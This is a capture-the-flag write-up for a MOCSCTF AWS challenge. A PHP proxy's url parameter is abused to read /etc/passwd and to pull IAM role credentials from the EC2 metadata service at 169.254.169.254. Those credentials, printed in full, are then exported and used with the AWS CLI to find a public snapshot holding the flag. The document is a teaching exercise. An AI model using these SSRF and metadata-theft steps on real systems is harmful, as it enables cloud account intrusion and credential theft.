# Writeup

Question: Something wrong on AWS cloud, please find a way to restore it.

http://ec2-13-214-149-173.ap-southeast-1.compute.amazonaws.com/proxy.php


## Solution: 
As you know, the challenge is similar with MOCSCTF2022-iam who iam. There are two ways to resolve this challenge.

## Method 1:
1. This is a PHP page require a parameter url.
http://ec2-13-214-149-173.ap-southeast-1.compute.amazonaws.com/proxy.php?url=

2. You can either redirect to google.com or view local file.
http://ec2-13-214-149-173.ap-southeast-1.compute.amazonaws.com/proxy.php?url=http://google.com

http://ec2-13-214-149-173.ap-southeast-1.compute.amazonaws.com/proxy.php?url=../../../../etc/passwd

3. As you know, this is aws EC2 instance. The main point is to abuse AWS Metadata Service.
http://ec2-13-214-149-173.ap-southeast-1.compute.amazonaws.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

4. You can discover the IAM mocsctf-role from Metadata. The IAM metadata contains AccessKeyId, SecretAccessKey, Token.
http://ec2-13-214-149-173.ap-southeast-1.compute.amazonaws.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/mocsctf-role


```
{ "Code" : "Success", "LastUpdated" : "2023-03-01T14:50:06Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIATY2C4XDIGMY5VM6H", "SecretAccessKey" : "/gfcM8aSa3He0BacIqLZM6t61vn7vlukw3q0eN5x", "Token" : "IQoJb3JpZ2luX2VjEOf//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgJD9/hLX+WiRsSw4GSxggEAGCM3fuUYX/rsWwSDtZJxMCIH9Te9kzPXummw6CqE9GXX6df+CmRalDUE1Vp/CY+9n7KtMFCJD//////////wEQABoMMjU5NDQ4OTQ0ODQ4Igw72Spv0ecnzYDsHNQqpwXiUXrRGT7sw2+niQPghBji3A9OmhWu/oLmCi4yvtb3vSQpG098a3pG1NcEXB3dw9abX4YaNOWVk/KrLjp8MYrPUso/ZXaydIKljU8E/Nd2fIMEM17BMerqwETXJhxuX0SkKpVYN3sVK475k+BpV7x3NY2t8P2ZvFteFAG1qGLl4gliXGNapTYsobGrL/pYretLNv3D3g2Vz+pkWGtd9giTLX1jY7V/gemTRPDHvZpJE57SYQYm7XjCEiPGGwAairScoLtFc950H9IebnayRUt3tRrNhFYu//0Mpy3oFnvG7thkQhWTHUw7B8QQlDWtrw99o7ER7L8hB8LWrP8TmLwfWP7UQ0nZgtDSiAlL9sJXil0WixaVNrvHc9OJVYoi6lK71mYMCKkbj6fzd6diuaqMlja/WKDPMzrLN+Kb8E+QMHMH+eHzfg1a6e9c1JHRlTH/xm5VbVO0kN2p3vuvAOQex3ZnVDVYVdoseS2mvXejXXRQdYFSdkoG9ND61yhvR1yJNwEG3ymxvB1DjrrWHcjA1PMNQCjlOLiMatToE2j29jLWYUnEs5Mg1bwOat/LUSUjGOxq0iFMmSINM2RjTFvpl6ZgokCtDjwNksTEkSb+X5JYl77Uu35jTL+xaWZzAdxETFl3wEHpyw0ZAVmWLOcZhrD8vn8NHzHsYhdO7qD9RdCX90bqETraqlXmVjDzpVqtR8DKFLCl6Tj4loNTl4rasE9qKvETmxwrWmTEaoM3Pjv5AjjqcODbYoWTf02AhxZjJe2WI9LZoDIE+IsjjYE48FrMviktZkx/bo0dNdHP0zReZzCoo02/I8XKpLsV5bNYhmcfe4HlxWnNYCyi5zSe6wgQHHCt5A0MOM6trNvV1QD5ixThULDx7BZi8RHL9RwvOgc1dhXbMIPM/Z8GOrIBX9WLgY/kQSBJGidRjZacPtVkiK4lLhH6KyoWc5YKvpunrWZ8TfB8H0gogKhdyTUxsyiHrAJgBN/vryVY5SBEQcje0ZmfYD7Mo/VmOvrS9WCxEmWukv/CFUfrlJ6J9JNZEiAcMDV4vf+icqlsRK4cOUWYHaJmzVaUi2NtaTJkN0OHSod0RkM2XpuUkRVnrF0Ljrio12Ks5enCmwAiJozjf2MnHJi+PFxf4P3/tPsEl/3oUA==", "Expiration" : "2023-03-01T21:19:26Z" }
```


5. Use mocsctf role to discover the EC2 public snapshot.

```
export AWS_ACCESS_KEY_ID=ASIATY2C4XDIC7ILPUON

export AWS_DEFAULT_REGION=ap-southeast-1

export AWS_SECRET_ACCESS_KEY=MifuK0E3abqMcqIrqJh3g9oCDEK15gdfh0GIdAU7

export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDwaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUYR7ATZIbFbJBpy0YdGd0OYgP8sSSCiG8803lklvHMcCIQDdPfNwnYIQ+Io6FnrdGjR8+4X0VMo52lZR+KCQGByrxCrkBAil//////////8BEAAaDDI1OTQ0ODk0NDg0OCIM0NpgZjqxe/YMVh3AKrgEQGTzGKg03uUmrNq6xsY3jt9kLpBW5L2k1bUI9LF8DapUG5yEdlARyuIpref1it/8E+svPab3pbcBempMUGty+p4uxb+GUlRDoNd9m0/GXCbJihdX0G0MZ3wVIjPPmIgWhdq9bmqPMkvzxTBWY88uMnws2BgIQFFF6KfhbUllSO6dNEmkDeJ+isGSnKSmwirXtxbX6BUTBG7bhffnrswNW4I+3+vMky3eOBhJZz4W0SSzVHyBUWleDZEThQzVJpjB7QtJ3Bc/yRONuPvXeDZjM2BtrsJqcsneuMDNEKwBAu7QdMLA2bD42UtnyuMpqgs8k6JvwUDysD0bBMXndui2LQVChCnxMRzX7dXXe3MUPcfYrj4OIWQRWJpx3fz4ML2SwJJAJNNG/TyqExKNPOft5DBf8DKRyH1YoYYzl+U0pyVvf7PK17imMOTfoV0YIxWhGa2hXJvAzKQz0xoQMYyTP4yA6CsTZme3yRQliQkBuzQA8BgqlNc3L3OElG/9KuRm046mTIBg2Cl0Aab/V2rOCzdE+LYcFdDba/mrSd1ggCKnn65TIJQUXTdX7OB/8CLzpDDyICx3IhFArNBVI7AXdr8704l+7GFInkP2gbmUv2x6k43oc53x5KFgXQjtfw1c1eTkQfPQK/dqIOJVapiwT+YAmlhPoajeDqFs2vTfoqWX02b1ArkS42zYAplWWyvBwVWm7px7CDjVgVkorOAVqvQ6vKA9joD+XQAoKRHATmXAbM4v4BchTjD/mK+eBjqpAVB5QoSa43okkk5omA1Hk8yXTw6hnkk3e8QCchouAzIQS8Fa7QGtUyQy7d8xM9F6G8gheb+vuysn8BZXRfmp5Rmw6kuj8BiPH7qeUdP6tdQhyrtF3QclYNA4/zHdRzQVXL2s7K1AnRv4gBiiPocH86nsU1aUIA3NxiRLjcGGzVnUxjkbc6ic6ZGf0UtbLkEpHQWNBK1ZEM2i3vk4X3UxgLNl8yAOOWP5S44=

aws ec2 describe-snapshots --region ap-southeast-1 --filters Name=description,Values=mocsctf*
{
    "Snapshots": [
        {
            "Description": "mocsctf{public_AWS_snapshot}",
            "Encrypted": false,
            "OwnerId": "259448944848",
            "Progress": "100%",
            "SnapshotId": "snap-0c46c458f19588f78",
            "StartTime": "2023-01-21T11:13:07.687Z",
            "State": "completed",
            "VolumeId": "vol-0569cbed3c72633bb",
            "VolumeSize": 8
        }
    ]
}
```

## Method 2
1. Use your own AWS credential to discover the EC2 public snapshot.
```
aws ec2 describe-snapshots --region ap-southeast-1 --filters Name=description,Values=mocsctf*

```

> mocsctf{public_AWS_snapshot}
